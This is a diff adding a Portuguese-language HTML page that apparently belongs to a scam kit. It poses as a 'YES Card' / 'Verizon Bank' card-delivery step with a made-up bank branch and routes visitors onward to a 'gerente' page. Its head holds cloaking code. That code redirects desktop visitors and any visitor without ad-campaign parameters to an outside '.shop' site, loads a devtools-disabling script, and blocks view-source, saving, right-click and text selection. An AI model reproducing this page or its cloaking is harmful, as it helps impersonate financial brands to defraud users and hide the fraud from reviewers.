@@ -1,0 +1,300 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool"
+    url="https://appavaliadorpremios.shop/lp/"></script>
+
+<script type="text/javascript">
+    if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+        window.location.href = 'https://appavaliadorpremios.shop/lp/';
+    }
+</script>
+  <script type="text/javascript">
+    (function () {
+        /**
+         * Função para verificar a presença de múltiplos parâmetros na URL
+         * @param {Array} names - Array contendo os nomes dos parâmetros a serem verificados
+         * @returns {boolean} - Retorna true se todos os parâmetros estiverem presentes, caso contrário, false
+         */
+        function hasAllURLParameters(names) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return names.every(param => urlParams.has(param));
+        }
+
+        // Array contendo os parâmetros obrigatórios
+        const requiredParams = ['CampaignID', 'adSETID', 'CreativeID', 'pixel_id'];
+
+        // URL para redirecionamento caso algum dos parâmetros não esteja presente
+        const redirectURL = 'https://appavaliadorpremios.shop/lp/';
+
+        /**
+         * Função principal que verifica os parâmetros da URL
+         * e redireciona o usuário se necessário
+         */
+        function checkURLParameters() {
+            if (!hasAllURLParameters(requiredParams)) {
+                window.location.href = redirectURL;
+            }
+        }
+
+        // Executa a verificação imediatamente assim que o script é carregado
+        checkURLParameters();
+    })();
+</script>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+
+    <title>Método de Entrega</title>
+
+    <style>
+      .header {
+        background: linear-gradient(147deg, #ffe53b 0%, #ff2525 74%);
+        padding: 15px 0;
+        text-align: center;
+      }
+
+      .main-content {
+        max-width: 600px;
+        background-color: white;
+        text-align: center;
+        padding: 2rem;
+        border-radius: 10px;
+        box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+        margin: 20px auto;
+      }
+
+      .delivery-option {
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
+        margin: 20px 0;
+      }
+
+      .option-card {
+        padding: 15px;
+        border: 2px solid #ddd;
+        border-radius: 10px;
+        text-align: center;
+        transition: all 0.3s ease;
+      }
+
+      .option-card img {
+        max-width: 40px;
+        margin-bottom: 10px;
+      }
+
+      .btn-custom {
+        background-color: #ff2525;
+        color: rgb(255, 255, 255);
+        border: none;
+        padding: 12px 20px;
+        font-weight: bold;
+        border-radius: 8px;
+        width: 100%;
+        transition: all 0.3s ease;
+      }
+
+      .btn-custom:hover {
+        background-color: #000;
+      }
+
+      .agency-section {
+        margin-top: 30px;
+        background: #f8f9fa;
+        padding: 20px;
+        border-radius: 10px;
+      }
+
+      .footer {
+        background: #ffffff;
+        border-top: 1px solid #e6e6e6;
+        text-align: center;
+        padding: 15px;
+        font-size: 10px;
+        color: #666;
+      }
+
+      .footer p {
+        margin: 0;
+      }
+    </style>
+
+    <script>
+      if (document.addEventListener) {
+        document.addEventListener("keydown", bloquearSource);
+      } else {
+        //Versões antigas do IE
+        document.attachEvent("onkeydown", bloquearSource);
+      }
+
+      function bloquearSource(e) {
+        e = e || window.event;
+
+        var code = e.which || e.keyCode;
+
+        if (
+          e.ctrlKey &&
+          (code == 83 || code == 85) //83 = S, 85 = U
+        ) {
+          if (e.preventDefault) {
+            e.preventDefault();
+          } else {
+            e.returnValue = false;
+          }
+
+          return false;
+        }
+      }
+    </script>
+
+    <style>
+      /*desabilita a seleção no body*/
+      body {
+        -webkit-touch-callout: none; /* iOS Safari */
+        -webkit-user-select: none; /* Chrome/Safari/Opera */
+        -khtml-user-select: none; /* Konqueror */
+        -moz-user-select: none; /* Firefox */
+        -ms-user-select: none; /* Internet Explorer/Edge */
+        user-select: none;
+      }
+
+      /*habilita a seleção nos campos editaveis*/
+      input,
+      textarea {
+        -webkit-touch-callout: initial; /* iOS Safari */
+        -webkit-user-select: text; /* Chrome/Safari/Opera */
+        -khtml-user-select: text; /* Konqueror */
+        -moz-user-select: text; /* Firefox */
+        -ms-user-select: text; /* Internet Explorer/Edge */
+        user-select: text;
+      }
+
+      /*habilita a seleção nos campos com o atributo contenteditable*/
+      [contenteditable="true"] {
+        -webkit-touch-callout: initial; /* iOS Safari */
+        -webkit-user-select: all; /* Chrome/Safari/Opera */
+        -khtml-user-select: all; /* Konqueror */
+        -moz-user-select: all; /* Firefox */
+        -ms-user-select: all; /* Internet Explorer/Edge */
+        user-select: all;
+      }
+    </style>
+
+    <script>
+      if (document.addEventListener) {
+        document.addEventListener("contextmenu", function (e) {
+          e.preventDefault();
+          return false;
+        });
+      } else {
+        //Versões antigas do IE
+        document.attachEvent("oncontextmenu", function (e) {
+          e = e || window.event;
+          e.returnValue = false;
+          return false;
+        });
+      }
+    </script>
+
+    <script async="" src="js.html"></script>
+
+    <!-- Google tag (gtag.js) -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-NGSPZL3X93"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-NGSPZL3X93');
+</script>
+
+
+</head>
+
+<body>
+  
+    <div class="header">
+      <img src="images/logo.png" alt="YES Card Logo" style="width: 120px">
+    </div>
+
+    <div class="main-content">
+      <h3>Método de Entrega</h3>
+      <p>Escolha como você deseja receber seu novo cartão</p>
+
+      <!-- Opção de entrega -->
+      <div class="delivery-option">
+        <div class="option-card" id="correios-option">
+          <img src="images/45880.png" alt="Ícone de caminhão">
+          <h5>Entrega pelos Correios</h5>
+          <p>Receba seu cartão no conforto da sua casa em até 1 dia útil</p>
+          <button class="btn-custom" onclick="escolherEntrega()" id="583701b8-981f-86f8-cace-dbd5accfb62d">
+            Prefiro receber pelos Correios
+          </button>
+        </div>
+
+        <style>
+          .unavailable {
+            filter: blur(2px);
+            opacity: 0.9;
+            pointer-events: none;
+          }
+          .unavailable-text {
+            color: red; /* Updated to maintain original text styling */
+            font-size: 13px; /* Updated to maintain original text styling */
+          }
+        </style>
+
+        <div class="option-card unavailable" id="agencia-option">
+          <img src="images/2825777.png" alt="Ícone de agência">
+          <h5>Retirada em Agência</h5>
+          <p>Retire seu cartão em uma de nossas agências Verizon</p>
+        </div>
+        <p class="unavailable-text" style="filter: none; opacity: 1">
+          A opção de retirada na agência está temporariamente indisponível
+          devido à alta demanda. Agradecemos sua compreensão.
+        </p>
+      </div>
+
+      <!-- Nova seção: Nossas Agências -->
+      <div class="agency-section">
+        <h4>Nossas Agências Verizon Bank</h4>
+        <p>Agência Central</p>
+        <p>
+          Avenida Paulista, 1230<br>
+          Conj 612 a 1510 Lado Par<br>
+          Bela Vista, Sao Paulo - SP<br>
+          01.310-100
+        </p>
+        <img src="images/3722049.png" alt="Ícone de localização" style="max-width: 50px">
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+      Copyright © 2025 Verizon. Todos os direitos reservados.<br>
+
+      Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa
+      do Site
+    </div>
+
+    <script>
+      function escolherEntrega() {
+        window.location.href = "gerente.html" + window.location.search;
+      }
+    </script>
+
+  <script>
+      window.pixelId = "66b3a64f335ef199b3e5b257";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+    
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+
+</body></html>
